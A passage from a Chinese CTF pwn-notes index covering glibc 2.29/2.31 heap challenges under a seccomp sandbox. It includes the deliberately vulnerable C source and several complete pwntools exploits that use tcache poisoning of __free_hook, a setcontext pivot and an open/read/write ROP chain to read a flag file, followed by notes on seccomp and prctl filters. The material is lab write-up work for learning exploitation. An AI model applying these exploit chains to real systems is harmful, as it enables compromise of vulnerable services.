puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 2.29之后setcontext有所改变，参数传递由rdi变成了rdx，所以需要控制rdx寄存器指向SigreturnFrame。 这里用到了一条神奇的gadgets mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 思路： 把free_hook指向这个gadgets，之后利用思路和之前类似 exp1 rop链写在堆上 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7fb553f5cca0-0x00007fb553d78000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x000000000012be97 setcontext_door = libcbase + libc.sym['setcontext']+53 delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026542 prsi_ret = libcbase+0x0000000000026f9e prdx_ret = libcbase+0x000000000012bda6 ret = libcbase+libc.search(asm(\"ret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = heapbase + 0x260+0x100 flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rsi=rop_addr frame.rsp=rop_addr frame.rip=libcbase + libc.sym['setcontext']+127 add(0x500) #4 edit(4,p64(setcontext_door)+p64(heapbase+0x260)+str(frame).ljust(0x100,'\\x00')[0x10:]+payload) #gdb.attach(p,'b *'+str(gadgets)) #pause() delete(4) p.interactive() exp2 rop链写在free_hook附近 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/home/tty18pwn/Desktop/glibc-all-in-one-master/libs/2.29-0ubuntu2_amd64/libc-2.29.so') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x260 libcbase = leak - (0x7fb553f5cca0-0x00007fb553d78000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x000000000012be97 setcontext_door = libcbase + libc.sym['setcontext']+53 delete(1) edit(1,p64(free_hook)) add(0x10)#2 add(0x10)#3 edit(3,p64(gadgets)) #=========================setcontext=========================== rop_addr = free_hook & 0xffffffffffffffff frame = SigreturnFrame() frame.rax=0 frame.rdi=0 frame.rsi=rop_addr frame.rdx=0x300 frame.rsp=rop_addr frame.rip= libcbase+0xcf6c5#syscall;ret; #=============================================== prdi_ret = libcbase+0x0000000000026542 prsi_ret = libcbase+0x0000000000026f9e prdx_ret = libcbase+0x000000000012bda6 ret = libcbase+libc.search(asm(\"ret\")).next() def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_ret)+p64(arg3) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' add(0x500) #4 edit(4,p64(setcontext_door)+p64(heapbase+0x260)+str(frame).ljust(0x100,'\\x00')[0x10:]) #gdb.attach(p,'b *'+str(gadgets)) delete(4) pause() p.send(payload) p.interactive() "},"沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html":{"url":"沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html","title":"glibc2.31下堆题绕过沙箱","keywords":"","body":"glibc2.31下堆题绕过沙箱 还是用相同的题目 gcc -o test test.c #include #include #include #include #include #include int Nodes_len[0x10]; char *Nodes[0x10]; int count=0; int get_atoi() { char buf[8]; read(0,buf,8); return atoi(buf); } void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } void add(){ int len; printf(\"len:\"); scanf(\"%d\",&len); if(len0xfff) exit(0); if(count>0x10){ puts(\"too many\"); exit(0); } Nodes[count] = malloc(len); Nodes_len[count] = len; count++; puts(\"done!\"); } void del(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } free(Nodes[idx]); puts(\"done!\"); } void edit(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } read(0,Nodes[idx],Nodes_len[idx]); puts(\"done!\"); } void show(){ int idx; printf(\"idx:\"); scanf(\"%d\",&idx); if(idx>count){ puts(\"error!\"); exit(0); } write(1,Nodes[idx],Nodes_len[idx]); } void gift(){ printf(\"heap_base:%p\\n\",Nodes[0]); } void menu(){ puts(\"1.add\"); puts(\"2.delete\"); puts(\"3.edit\"); puts(\"4.show\"); puts(\"5.gift\"); puts(\"6.exit\"); printf(\"choice:\"); } void init() { setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); } int main(){ init(); sandbox(); while(1){ int choice; menu(); choice = get_atoi(); switch(choice){ case 1: add(); break; case 2: del(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; default: puts(\"invalued input!\"); exit(0); } } return 0; } 方法一 2.31下和2.29下情况差不多，不过用的gadgets有所改变 gadgets变成下面这条 mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext又发生了细微的变化，但对利用而言没啥变化，就是偏移变了，变成了setcontext+61。 0x7ffff7e1a0a0 : endbr64 0x7ffff7e1a0a4 : push rdi 0x7ffff7e1a0a5 : lea rsi,[rdi+0x128] 0x7ffff7e1a0ac : xor edx,edx 0x7ffff7e1a0ae : mov edi,0x2 0x7ffff7e1a0b3 : mov r10d,0x8 0x7ffff7e1a0b9 : mov eax,0xe 0x7ffff7e1a0be : syscall 0x7ffff7e1a0c0 : pop rdx 0x7ffff7e1a0c1 : cmp rax,0xfffffffffffff001 0x7ffff7e1a0c7 : jae 0x7ffff7e1a1ef 0x7ffff7e1a0cd : mov rcx,QWORD PTR [rdx+0xe0] 0x7ffff7e1a0d4 : fldenv [rcx] 0x7ffff7e1a0d6 : ldmxcsr DWORD PTR [rdx+0x1c0] 0x7ffff7e1a0dd : mov rsp,QWORD PTR [rdx+0xa0] 0x7ffff7e1a0e4 : mov rbx,QWORD PTR [rdx+0x80] 0x7ffff7e1a0eb : mov rbp,QWORD PTR [rdx+0x78] 0x7ffff7e1a0ef : mov r12,QWORD PTR [rdx+0x48] 0x7ffff7e1a0f3 : mov r13,QWORD PTR [rdx+0x50] 0x7ffff7e1a0f7 : mov r14,QWORD PTR [rdx+0x58] 0x7ffff7e1a0fb : mov r15,QWORD PTR [rdx+0x60] 0x7ffff7e1a0ff : test DWORD PTR fs:0x48,0x2 0x7ffff7e1a10b : je 0x7ffff7e1a1c6 0x7ffff7e1a111 : mov rsi,QWORD PTR [rdx+0x3a8] 0x7ffff7e1a118 : mov rdi,rsi 0x7ffff7e1a11b : mov rcx,QWORD PTR [rdx+0x3b0] 0x7ffff7e1a122 : cmp rcx,QWORD PTR fs:0x78 0x7ffff7e1a12b : je 0x7ffff7e1a165 0x7ffff7e1a12d : mov rax,QWORD PTR [rsi-0x8] 0x7ffff7e1a131 : and rax,0xfffffffffffffff8 0x7ffff7e1a135 : cmp rax,rsi 0x7ffff7e1a138 : je 0x7ffff7e1a140 0x7ffff7e1a13a : sub rsi,0x8 0x7ffff7e1a13e : jmp 0x7ffff7e1a12d 0x7ffff7e1a140 : mov rax,0x1 0x7ffff7e1a147 : incsspq rax 0x7ffff7e1a14c : rstorssp QWORD PTR [rsi-0x8] 0x7ffff7e1a151 : saveprevssp 0x7ffff7e1a155 : mov rax,QWORD PTR [rdx+0x3b0] 0x7ffff7e1a15c : mov QWORD PTR fs:0x78,rax 0x7ffff7e1a165 : rdsspq rcx 0x7ffff7e1a16a : sub rcx,rdi 0x7ffff7e1a16d : je 0x7ffff7e1a18c 0x7ffff7e1a16f : neg rcx 0x7ffff7e1a172 : shr rcx,0x3 0x7ffff7e1a176 : mov esi,0xff 0x7ffff7e1a17b : cmp rcx,rsi 0x7ffff7e1a17e : cmovb rsi,rcx 0x7ffff7e1a182 : incsspq rsi 0x7ffff7e1a187 : sub rcx,rsi 0x7ffff7e1a18a : ja 0x7ffff7e1a17b 0x7ffff7e1a18c : mov rsi,QWORD PTR [rdx+0x70] 0x7ffff7e1a190 : mov rdi,QWORD PTR [rdx+0x68] 0x7ffff7e1a194 : mov rcx,QWORD PTR [rdx+0x98] 0x7ffff7e1a19b : mov r8,QWORD PTR [rdx+0x28] 0x7ffff7e1a19f : mov r9,QWORD PTR [rdx+0x30] 0x7ffff7e1a1a3 : mov r10,QWORD PTR [rdx+0xa8] 0x7ffff7e1a1aa : mov rdx,QWORD PTR [rdx+0x88] 0x7ffff7e1a1b1 : rdsspq rax 0x7ffff7e1a1b6 : cmp r10,QWORD PTR [rax] 0x7ffff7e1a1b9 : mov eax,0x0 0x7ffff7e1a1be : jne 0x7ffff7e1a1c3 0x7ffff7e1a1c0 : push r10 0x7ffff7e1a1c2 : ret 0x7ffff7e1a1c3 : jmp r10 0x7ffff7e1a1c6 : mov rcx,QWORD PTR [rdx+0xa8] 0x7ffff7e1a1cd : push rcx 0x7ffff7e1a1ce : mov rsi,QWORD PTR [rdx+0x70] 0x7ffff7e1a1d2 : mov rdi,QWORD PTR [rdx+0x68] 0x7ffff7e1a1d6 : mov rcx,QWORD PTR [rdx+0x98] 0x7ffff7e1a1dd : mov r8,QWORD PTR [rdx+0x28] 0x7ffff7e1a1e1 : mov r9,QWORD PTR [rdx+0x30] 0x7ffff7e1a1e5 : mov rdx,QWORD PTR [rdx+0x88] 0x7ffff7e1a1ec : xor eax,eax 0x7ffff7e1a1ee : ret 0x7ffff7e1a1ef : mov rcx,QWORD PTR [rip+0x192c7a] # 0x7ffff7face70 0x7ffff7e1a1f6 : neg eax 0x7ffff7e1a1f8 : mov DWORD PTR fs:[rcx],eax 0x7ffff7e1a1fb : or rax,0xffffffffffffffff 0x7ffff7e1a1ff : ret exp1 rop链在堆地址上 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x2a0 libcbase = leak - (0x7f6ce9833be0-0x7f6ce9648000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x154930#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext_door = libcbase + libc.sym['setcontext']+61 add(0x10)#2 delete(2) delete(1) edit(1,p64(free_hook)) add(0x10)#3 add(0x10)#4 edit(4,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026b72 prsi_ret = libcbase+0x0000000000027529 prdx_r12_ret = libcbase+0x000000000011c371 def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_r12_ret)+p64(arg3)+p64(0) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = heapbase + 0x2c0+0x100 flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rsi=rop_addr frame.rsp=rop_addr frame.rip=libcbase + 0x25679 #ret add(0x400) #5 ct = p64(0)+p64(heapbase+0x2c0) ct = ct.ljust(0x20,'\\x00') + p64(setcontext_door) ct += str(frame).ljust(0x100,'\\x00')[0x28:] ct += payload edit(5,ct) #gdb.attach(p,'b *'+str(gadgets)) pause() delete(5) p.interactive() exp2 rop链放在free_hook附近 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x2a0 libcbase = leak - (0x7f6ce9833be0-0x7f6ce9648000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x154930#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext_door = libcbase + libc.sym['setcontext']+61 add(0x10)#2 delete(2) delete(1) edit(1,p64(free_hook)) add(0x10)#3 add(0x10)#4 edit(4,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026b72 prsi_ret = libcbase+0x0000000000027529 prdx_r12_ret = libcbase+0x000000000011c371 def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_r12_ret)+p64(arg3)+p64(0) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = free_hook & 0xffffffffffffffff flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rax = 0 frame.rdi = 0 frame.rsi=rop_addr frame.rdx = 0x300 frame.rsp=rop_addr frame.rip=libcbase + 0x66229 #syscall;ret; add(0x400) #5 ct = p64(0)+p64(heapbase+0x2c0) ct = ct.ljust(0x20,'\\x00') + p64(setcontext_door) ct += str(frame).ljust(0x100,'\\x00')[0x28:] edit(5,ct) #gdb.attach(p,'b *'+str(gadgets)) delete(5) pause() p.send(payload) p.interactive() "},"沙箱/seccomp&ptcl/seccomp&ptcl.html":{"url":"沙箱/seccomp&ptcl/seccomp&ptcl.html","title":"seccomp&ptcl","keywords":"","body":"详细细节看这篇 https://www.anquanke.com/post/id/208364#h2-2 沙箱可以禁用一些系统调用，还是比较常见的感觉。 seccomp 下面这段代码用seccomp沙箱来禁用 安装相应库 sudo apt-get install libseccomp-dev 具体参数啥的就不多讲了。。。看大佬的博客就行。 //gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp #include #include #include int main(void){ scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); //seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0); seccomp_load(ctx); char * filename = \"/bin/sh\"; char * argv[] = {\"/bin/sh\",NULL}; char * envp[] = {NULL}; write(1,\"i will give you a shell\\n\",24); syscall(59,filename,argv,envp);//execve return 0; } $ ./simple_syscall_seccomp i will give you a shell Bad system call (core dumped) （以下直接搬运了） scmp_filter_ctx是过滤器的结构体 seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。 seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截 seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效 注意：编译的时候要在最后面加 -lseccomp 但是这种禁用方式会涉及到堆的操作，会留下堆使用痕迹，出题不用这种，假如栈题倒是可以用。正常用倒是方便，直接调库就行。 prctl 另外一种禁用手段，不会有堆操作，具体原理看大佬文章。。。 示例代码 #include #include #include #include void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } 直接加这个函数就行，这里只禁用了execve。 Seccomp Tools 一个查沙箱禁用规则的工具 安装 sudo apt install gcc ruby-dev sudo gem install seccomp-tools 使用方法seccomp-tools dump ./file "}}